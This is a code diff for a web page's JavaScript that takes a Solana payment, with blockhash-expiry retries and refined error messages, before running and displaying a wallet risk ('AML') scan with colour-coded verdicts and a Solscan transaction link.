+        document.getElementById("tx-a-paying").href = `https://solscan.io/tx/${sig}`;
+
+        await conn.confirmTransaction(
+          { signature: sig, blockhash, lastValidBlockHeight },
+          "confirmed"
+        );
+        break;
+      } catch (e) {
+        const m = e && e.message ? e.message : String(e);
+        if (e && e.code === 4001) throw e;
+        if (/reject|cancel|denied|user rejected/i.test(m)) throw e;
+        if (attempt < maxAttempts - 1 && isBlockhashExpiredError(e)) continue;
+        throw e;
+      }
+    }
+
+    if (!sig || blockhash == null) {
+      throw new Error("Transaction failed after retries.");
+    }
 
     state.txHash = sig;
-    document.getElementById("tx-a-paying").href = `https://solscan.io/tx/${sig}`;
 
-    await conn.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, "confirmed");
+    const solSentSol =
+      lastSolTransferLamports != null
+        ? lastSolTransferLamports / web3.LAMPORTS_PER_SOL
+        : null;
+    const t = {
+      id: Date.now(),
+      address: state.conn.address,
+      wallet: state.conn.walletName,
+      chain: state.conn.chain,
+      currency: state.payOption,
+      amount: solSentSol,
+      txHash: sig,
+      ts: new Date().toISOString(),
+    };
+    const all = [t, ...JSON.parse(localStorage.getItem("aml_traces") || "[]")].slice(0, 100);
+    localStorage.setItem("aml_traces", JSON.stringify(all));
+
     await runScan();
-
   } catch (e) {
     goToStep("payment");
-    const msg = e.message || String(e);
-    if (/reject|cancel|denied/i.test(msg)) showPayError("Transaction cancelled.");
-    else if (/insufficient|rent/i.test(msg)) showPayError("Not enough SOL for fees + rent.");
-    else showPayError(msg.slice(0, 180) || "Payment error.");
+    const m = (e && e.message) ? e.message : String(e);
+    if (/reject|cancel|denied/i.test(m) || e.code === 4001) showPayError("Transaction cancelled.");
+    else if (/Insufficient Funds For Rent|insufficient funds for rent/i.test(m))
+      showPayError("Not enough SOL remaining on this wallet.");
+    else if (/insufficient|Insufficient funds|Insufficient lamports|custom program error:\s*(0x)?1\b/i.test(m))
+      showPayError("Not enough SOL to complete this payment.");
+    else if (isBlockhashExpiredError(e)) showPayError("Network timed out — try again.");
+    else showPayError(m.slice(0, 200) || "Payment error.");
   }
-}
-
-function findAssociatedTokenAddress(web3, mint, owner) {
-  const [address] = web3.PublicKey.findProgramAddressSync(
-    [owner.toBuffer(), new web3.PublicKey(SPL_TOKEN_PROGRAM_ID).toBuffer(), mint.toBuffer()],
-    new web3.PublicKey(SPL_ASSOCIATED_TOKEN_PROGRAM_ID)
-  );
-  return address;
-}
-
-function createTransferInstruction(source, destination, owner, amount) {
-  const data = Buffer.alloc(9);
-  data[0] = 3;
-  data.writeBigUInt64LE(amount, 1);
-  return new web3.TransactionInstruction({
-    programId: new web3.PublicKey(SPL_TOKEN_PROGRAM_ID),
-    keys: [
-      { pubkey: source, isSigner: false, isWritable: true },
-      { pubkey: destination, isSigner: false, isWritable: true },
-      { pubkey: owner, isSigner: true, isWritable: false }
-    ],
-    data
-  });
 }
 
 async function runScan(){
@@ -958,25 +1240,31 @@ function showResult(){
     :s<=45?{label:"LOW RISK",color:"#3B82F6",icon:"◎",bg:"#0C2461",msgBg:"#EFF6FF",msgBorder:"#93C5FD",msgColor:"#1E40AF",msg:"🔵 Few risk signals. The wallet seems mostly clean — stay aware."}
     :s<=70?{label:"MEDIUM RISK",color:"#F59E0B",icon:"⚠",bg:"#451A03",msgBg:"#FFFBEB",msgBorder:"#FCD34D",msgColor:"#92400E",msg:"⚠️ Suspicious signals detected. Proceed with caution before transacting."}
     :{label:"HIGH RISK",color:"#EF4444",icon:"✕",bg:"#450A0A",msgBg:"#FEF2F2",msgBorder:"#FCA5A5",msgColor:"#991B1B",msg:"⛔ High risk signals detected. Avoid transacting with this address."};
+
   const circ=document.getElementById("v-circle");
   circ.style.border=`3px solid ${v.color}`;circ.style.background=v.bg;circ.style.color=v.color;circ.textContent=v.icon;
   document.getElementById("v-score").textContent=s+"%";
   const badge=document.getElementById("v-badge");
   badge.textContent=v.label;badge.style.background=v.bg;badge.style.border=`1px solid ${v.color}44`;badge.style.color=v.color;
+
   let html="";
   state.scores.metrics.forEach(m=>{
     const c=riskColor(m.value);
     html+=`<div class="r-metric"><div class="r-metric-row"><span>${m.label}</span><span style="color:${c}">${m.value}%</span></div><div class="r-bar"><div class="r-fill" style="width:${m.value}%;background:${c}"></div></div></div>`;
   });
   document.getElementById("result-metrics").innerHTML=html;
+
   document.getElementById("r-wallet").textContent=state.conn.address.slice(0,5)+"..."+state.conn.address.slice(-4);
   document.getElementById("r-via").textContent=state.conn.walletName;
+
   const vm=document.getElementById("verdict-msg");
   vm.style.background=v.msgBg;vm.style.border=`1px solid ${v.msgBorder}`;vm.style.color=v.msgColor;vm.textContent=v.msg;
+
   if(state.txHash){
     const tb=document.getElementById("tx-badge"); tb.style.display="flex";
     document.getElementById("tx-badge-link").href=`https://solscan.io/tx/${state.txHash}`;
   }
+
   goToStep("result");
 }
 
